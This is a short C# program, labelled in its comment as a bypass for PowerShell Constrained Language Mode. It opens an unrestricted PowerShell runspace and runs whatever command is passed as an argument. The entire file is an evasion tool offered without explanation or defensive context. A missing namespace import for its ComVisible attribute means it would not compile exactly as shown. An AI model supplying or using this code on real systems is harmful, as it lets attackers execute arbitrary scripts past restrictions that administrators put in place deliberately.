using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    // Bypasses CLM
    [ComVisible(true)]
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Provide command");
                return;
            }

            Runspace rs = RunspaceFactory.CreateRunspace();
            String cmd = args[0];
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}